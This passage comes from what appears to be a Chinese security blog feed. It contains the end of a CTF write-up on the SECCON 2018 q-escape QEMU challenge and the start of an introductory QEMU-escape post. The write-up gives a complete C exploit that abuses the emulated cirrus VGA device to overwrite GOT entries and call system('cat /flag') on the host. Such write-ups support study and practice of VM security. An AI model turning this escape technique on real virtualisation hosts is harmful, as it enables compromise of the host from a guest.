&amp;&amp; ((1LL &lt;&lt; <span class="string">cr_index) &amp; 0x8200F1) != 0 )</span></span><br><span class="line"><span class="string">  LABEL_35:</span></span><br><span class="line"><span class="string">  opaque-&gt;vga.update_retrace_info((VGACommonState *)opaque);</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  else if ( (_BYTE)cr_index</span> == 7 )</span><br><span class="line">  &#123;</span><br><span class="line">  opaque-&gt;vga.cr[7] = value &amp; 0x10 | opaque-&gt;vga.cr[7] &amp; 0xEF;</span><br><span class="line">  &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( (unsigned __int8)cr_index &lt;= 0x1Du )</span><br><span class="line">  &#123;</span><br><span class="line">  opaque-&gt;vga.cr[cr_index] = value;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">break</span>;</span><br><span class="line">  <span class="keyword">case</span> 0xAuLL:</span><br><span class="line">  <span class="keyword">case</span> 0x2AuLL:</span><br><span class="line">  opaque-&gt;vga.fcr = value &amp; 0x10;</span><br><span class="line">  <span class="built_in">break</span>;</span><br><span class="line">  <span class="keyword">case</span> 0x10uLL:</span><br><span class="line">  ar_flip_flop = opaque-&gt;vga.ar_flip_flop;</span><br><span class="line">  <span class="keyword">if</span> ( ar_flip_flop )</span><br><span class="line">  &#123;</span><br><span class="line">  v13 = opaque-&gt;vga.ar_index &amp; 0x1F;</span><br><span class="line">  switch ( opaque-&gt;vga.ar_index &amp; 0x1F )</span><br><span class="line">  &#123;</span><br><span class="line">  <span class="keyword">case</span> 0:</span><br><span class="line">  <span class="keyword">case</span> 1:</span><br><span class="line">  <span class="keyword">case</span> 2:</span><br><span class="line">  <span class="keyword">case</span> 3:</span><br><span class="line">  <span class="keyword">case</span> 4:</span><br><span class="line">  <span class="keyword">case</span> 5:</span><br><span class="line">  <span class="keyword">case</span> 6:</span><br><span class="line">  <span class="keyword">case</span> 7:</span><br><span class="line">  <span class="keyword">case</span> 8:</span><br><span class="line">  <span class="keyword">case</span> 9:</span><br><span class="line">  <span class="keyword">case</span> 0xA:</span><br><span class="line">  <span class="keyword">case</span> 0xB:</span><br><span class="line">  <span class="keyword">case</span> 0xC:</span><br><span class="line">  <span class="keyword">case</span> 0xD:</span><br><span class="line">  <span class="keyword">case</span> 0xE:</span><br><span class="line">  <span class="keyword">case</span> 0xF:</span><br><span class="line">  <span class="keyword">case</span> 0x12:</span><br><span class="line">  opaque-&gt;vga.ar[v13] = value &amp; 0x3F;</span><br><span class="line">  <span class="built_in">break</span>;</span><br><span class="line">  <span class="keyword">case</span> 0x10:</span><br><span class="line">  opaque-&gt;vga.ar[v13] = value &amp; 0xEF;</span><br><span class="line">  <span class="built_in">break</span>;</span><br><span class="line">  <span class="keyword">case</span> 0x11:</span><br><span class="line">  goto LABEL_42;</span><br><span class="line">  <span class="keyword">case</span> 0x13:</span><br><span class="line">  <span class="keyword">case</span> 0x14:</span><br><span class="line">  LOBYTE(value) = value &amp; 0xF;</span><br><span class="line">  LABEL_42:</span><br><span class="line">  opaque-&gt;vga.ar[v13] = value;</span><br><span class="line">  <span class="built_in">break</span>;</span><br><span class="line">  default:</span><br><span class="line">  <span class="built_in">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">  opaque-&gt;vga.ar_index = value &amp; 0x3F;</span><br><span class="line">  &#125;</span><br><span class="line">  opaque-&gt;vga.ar_flip_flop = ar_flip_flop ^ 1;</span><br><span class="line">  <span class="built_in">break</span>;</span><br><span class="line">  <span class="keyword">case</span> 0x12uLL:</span><br><span class="line">  opaque-&gt;vga.msr = value &amp; 0xEF;</span><br><span class="line">  opaque-&gt;vga.update_retrace_info((VGACommonState *)opaque);</span><br><span class="line">  <span class="built_in">break</span>;</span><br><span class="line">  <span class="keyword">case</span> 0x14uLL:</span><br><span class="line">  opaque-&gt;vga.sr_index = value;</span><br><span class="line">  <span class="built_in">break</span>;</span><br><span class="line">  ... ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>着狗屎ida翻译的是0x14</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.text:000000000068F5F6 48 81 EB B4 03 00 00          sub     addr, 3B4h                      ; switch 39 cases</span><br><span class="line">.text:000000000068F5FD 48 83 FB 26                   cmp     rbx, 26h</span><br><span class="line">.text:000000000068F601 77 C1                         ja      short def_68F603                ; jumptable 000000000068F603 default case, cases 950-953,955-959,961,963,970-973,976-979,982-985</span><br><span class="line">.text:000000000068F601                                                                       ; jumptable 000000000068F792 default case, cases 5,32-47,50-79,82-111,114-143,146-175,178-203,207,210-239</span><br><span class="line">.text:000000000068F601</span><br><span class="line">.text:000000000068F603 FF 24 DD 78 8E A9 00          jmp     ds:jpt_68F603[rbx*8]            ; switch jump</span><br></pre></td></tr></table></figure><p> 在这里是减去0x3B4</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230315161250131.png"                      alt="image-20230315161250131"                ></p><p>但是这里真正需要的是0x10，又一次翻译错误。</p><p>忽略这些小错误之后直接编写exp即可</p><h3 id="综上，可得exp"><a href="#综上，可得exp" class="headerlink" title="综上，可得exp"></a>综上，可得exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SHIFT 12</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SIZE (1 &lt;&lt; PAGE_SHIFT)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">die</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    perror(msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">va2pa</span><span class="params">(<span class="keyword">void</span> *addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> data;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;/proc/self/pagemap&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (!fd)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;open pagemap&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> offset = ((<span class="keyword">uintptr_t</span>)addr / PAGE_SIZE) * <span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (lseek(fd, offset, SEEK_SET) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;lseek&quot;</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (read(fd, &amp;data, <span class="number">8</span>) != <span class="number">8</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;read&quot;</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!(data &amp; (((<span class="keyword">uint64_t</span>)<span class="number">1</span> &lt;&lt; <span class="number">63</span>))))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;page&quot;</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> pageframenum = data &amp; ((<span class="number">1ull</span> &lt;&lt; <span class="number">55</span>) - <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">size_t</span> phyaddr = pageframenum * PAGE_SIZE + (<span class="keyword">uintptr_t</span>)addr % PAGE_SIZE;</span><br><span class="line"></span><br><span class="line">    close(fd);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> phyaddr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint32_t</span> vga_addr = <span class="number">0xa0000</span>;</span><br><span class="line"><span class="keyword">uint32_t</span> vga_size = <span class="number">0x20000</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> *mmio_mem;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> *vga_mem;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_sr</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> idx, <span class="keyword">unsigned</span> <span class="keyword">int</span> val)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    outb(idx, <span class="number">0x3c4</span>);</span><br><span class="line">    outb(val, <span class="number">0x3c5</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vga_mem_write</span><span class="params">(<span class="keyword">uint32_t</span> addr, <span class="keyword">uint8_t</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    *((<span class="keyword">uint8_t</span> *)(vga_mem + addr)) = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_latch</span><span class="params">(<span class="keyword">uint32_t</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> a;</span><br><span class="line">    a = vga_mem[(value &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xffff</span>]; <span class="comment">// write hight</span></span><br><span class="line">    write(<span class="number">1</span>, &amp;a, <span class="number">1</span>);</span><br><span class="line">    a = vga_mem[value &amp; <span class="number">0xffff</span>]; <span class="comment">// write low</span></span><br><span class="line">    write(<span class="number">1</span>, &amp;a, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    system(<span class="string">&quot;mknod -m 660 /dev/mem c 1 1&quot;</span>);</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;/dev/mem&quot;</span>, O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span> (fd == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    vga_mem = mmap(<span class="literal">NULL</span>, vga_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, vga_addr);</span><br><span class="line">    <span class="keyword">if</span> (!vga_mem)</span><br><span class="line">    &#123;</span><br><span class="line">        die(<span class="string">&quot;mmap vga mem failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ioperm(<span class="number">0x3b0</span>, <span class="number">0x30</span>, <span class="number">1</span>) == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        die(<span class="string">&quot;cannot ioperm&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    set_sr(<span class="number">7</span>, <span class="number">1</span>);       <span class="comment">// bypass first if</span></span><br><span class="line">    set_sr(<span class="number">0xcc</span>, <span class="number">4</span>);    <span class="comment">// v7==4</span></span><br><span class="line">    set_sr(<span class="number">0xcd</span>, <span class="number">0x10</span>); <span class="comment">// vs[0x10]</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> bss = <span class="number">0x109e000</span> + <span class="number">0x500</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> qemu_logfile = <span class="number">0x10CCBE0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> vfprintf_got = <span class="number">0xee7bb0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> system_plt = <span class="number">0x409dd0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> printf_chk_got = <span class="number">0xee7028</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> qemu_log = <span class="number">0x9726E8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> cat_flag[] = <span class="string">&quot;cat /flag&quot;</span>;</span><br><span class="line">    <span class="keyword">char</span> a;</span><br><span class="line">    <span class="keyword">char</span> *payload;</span><br><span class="line">    <span class="keyword">int</span> cur_size = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    a = vga_mem[<span class="number">1</span>];</span><br><span class="line">    write(<span class="number">1</span>, &amp;a, <span class="number">1</span>);</span><br><span class="line">    set_latch(bss);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">9</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        write(<span class="number">1</span>, &amp;cat_flag[i], <span class="number">1</span>);</span><br><span class="line">        vga_mem_write(<span class="number">0x18100</span>, cat_flag[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    cur_size += <span class="number">9</span>;</span><br><span class="line"></span><br><span class="line">    set_latch(qemu_logfile - cur_size);</span><br><span class="line">    payload = (<span class="keyword">char</span> *)&amp;bss;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        write(<span class="number">1</span>, &amp;payload[i], <span class="number">1</span>);</span><br><span class="line">        vga_mem_write(<span class="number">0x18100</span>, payload[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    cur_size += <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line">    set_latch(vfprintf_got - cur_size);</span><br><span class="line">    payload = (<span class="keyword">char</span> *)&amp;system_plt;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        write(<span class="number">1</span>, &amp;payload[i], <span class="number">1</span>);</span><br><span class="line">        vga_mem_write(<span class="number">0x18100</span>, payload[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    cur_size += <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line">    set_latch(printf_chk_got - cur_size);</span><br><span class="line">    payload = (<span class="keyword">char</span> *)&amp;qemu_log;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        write(<span class="number">1</span>, &amp;payload[i], <span class="number">1</span>);</span><br><span class="line">        vga_mem_write(<span class="number">0x18100</span>, payload[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    cur_size += <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line">    set_sr(<span class="number">0xcc</span>, <span class="number">2</span>);</span><br><span class="line">    vga_mem_write(<span class="number">0x18100</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230315163823703.png"                      alt="image-20230315163823703"                ></p><hr><p>参考链接:<br>  <a class="link"   href="https://www.anquanke.com/post/id/224199#h3-11" >https://www.anquanke.com/post/id/224199#h3-11<i class="fas fa-external-link-alt"></i></a><br>  <a class="link"   href="https://devcraft.io/2018/11/22/q-escape-seccon-2018.html" >https://devcraft.io/2018/11/22/q-escape-seccon-2018.html<i class="fas fa-external-link-alt"></i></a><br>  <a class="link"   href="https://github.com/qemu/qemu/blob/master/hw/display/cirrus_vga.c#L2004" >https://github.com/qemu/qemu/blob/master/hw/display/cirrus_vga.c#L2004<i class="fas fa-external-link-alt"></i></a><br>  <a class="link"   href="https://github.com/qemu/qemu/blob/master/hw/display/cirrus_vga_internal.h" >https://github.com/qemu/qemu/blob/master/hw/display/cirrus_vga_internal.h<i class="fas fa-external-link-alt"></i></a><br>题目链接:<br>  <a class="link"   href="https://github.com/196082/196082/blob/main/qemu_escape/q-escape.zip" >https://github.com/196082/196082/blob/main/qemu_escape/q-escape.zip<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;许久没有更新，前段时间一直考试所以一直拖着了。&lt;/p&gt;
&lt;h2 id=&quot;设备分析&quot;&gt;&lt;a href=&quot;#设备分析&quot; class=&quot;headerlink&quot; title=&quot;设备分析&quot;&gt;&lt;/a&gt;设备分析&lt;/h2&gt;&lt;p&gt;首先看看开了什么保护&lt;/p&gt;
&lt;figure class=&quot;h</summary>
      
    
    
    
    <category term="qemu escape" scheme="https://cv196082.gitee.io/categories/qemu-escape/"/>
    
    
    <category term="mmio" scheme="https://cv196082.gitee.io/tags/mmio/"/>
    
    <category term="pmio" scheme="https://cv196082.gitee.io/tags/pmio/"/>
    
    <category term="vga" scheme="https://cv196082.gitee.io/tags/vga/"/>
    
  </entry>
  
  <entry>
    <title>qemu逃逸入门</title>
    <link href="https://cv196082.gitee.io/2023/02/05/qemu%E9%80%83%E9%80%B8%E5%85%A5%E9%97%A8/"/>
    <id>https://cv196082.gitee.io/2023/02/05/qemu%E9%80%83%E9%80%B8%E5%85%A5%E9%97%A8/</id>
    <published>2023-02-05T09:39:57.000Z</published>
    <updated>2023-03-21T07:58:23.390Z</updated>
    
    <content type="html"><![CDATA[<p>首先总所周知的是，qemu是一个开源的模拟器和虚拟机，通过动态的二进制转换来模拟 CPU的工具。</p><p>在实际的环境中，qemu有多种运行模式，在以往可以使用User mode调试arm、mips架构的二进制程序。也在kernel pwn中用System mode调试完整的计算机系统。而qemu逃逸的题目指的就是System mode这种模式，题目的形式主要是给出存在漏洞的设备然后加以利用。</p><h2 id="qemu的内存结构"><a href="#qemu的内存结构" class="headerlink" title="qemu的内存结构"></a>qemu的内存结构</h2><p>qemu使用mmap为虚拟机申请出相应大小的内存，当做虚拟机的物理内存，且这部分内存没有执行权限。</p><h3 id="qemu的地址转化"><a href="#qemu的地址转化" class="headerlink" title="qemu的地址转化"></a>qemu的地址转化</h3><p>用户虚拟地址-&gt;用户物理地址</p><p>用户物理地址-&gt;qemu的虚拟地址空间：这里是将用户的物理地址转化为qemu使用mmap申请出来的地址空间，而这部分空间的内容与用户的物理地址一一对应。</p><p>在 x64 系统上，虚拟地址由 page offset (bits 0-11) 和 page number 组成，/proc/$pid/pagemap 这个文件中储存着此进程的页表，让用户空间进程可以找出每个虚拟页面映射到哪个物理帧（需要 CAP_SYS_ADMIN 权限），它包含一个 64 位的值，包含以下的数据。</p><ul><li>  Bits 0-54 page frame number (PFN) if present</li><li>  Bits 0-4 swap type if swapped</li><li>  Bits 5-54 swap offset if swapped</li><li>  Bit 55 pte is soft-dirty (see Documentation/vm/soft-dirty.txt)</li><li>  Bit 56 page exclusively mapped (since 4.2)</li><li>  Bits 57-60 zero</li><li>  Bit 61 page is file-page or shared-anon (since 3.5)</li><li>  Bit 62 page swapped</li><li>  Bit 63 page present</li></ul><p>根据以上信息，利用<code>/proc/pid/pagemap</code>可将虚拟地址转换为物理地址，具体步骤如下：</p><p>1、 计算虚拟地址所在虚拟页对应的数据项在<code>/proc/pid/pagemap</code>中的偏移，<code>offset=(viraddr/pagesize)*sizeof(uint64_t)</code></p><p>2、 读取长度为<code>64bits</code>的数据项</p><p>3、 根据<code>Bit 63</code> 判断物理内存页是否存在</p><p>4、 若物理内存页已存在，则取<code>bits 0-54</code>作为物理页号</p><p>5、 计算出物理页起始地址加上页内偏移即得到物理地址，<code>phtaddr = pageframenum * pagesize + viraddr % pagesize</code></p><p>对应代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/io.h&gt;</span>   </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SHIFT 12</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SIZE (1 &lt;&lt; PAGE_SHIFT)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">va2pa</span><span class="params">(<span class="keyword">void</span> *addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> data;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;/proc/self/pagemap&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (!fd)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;open 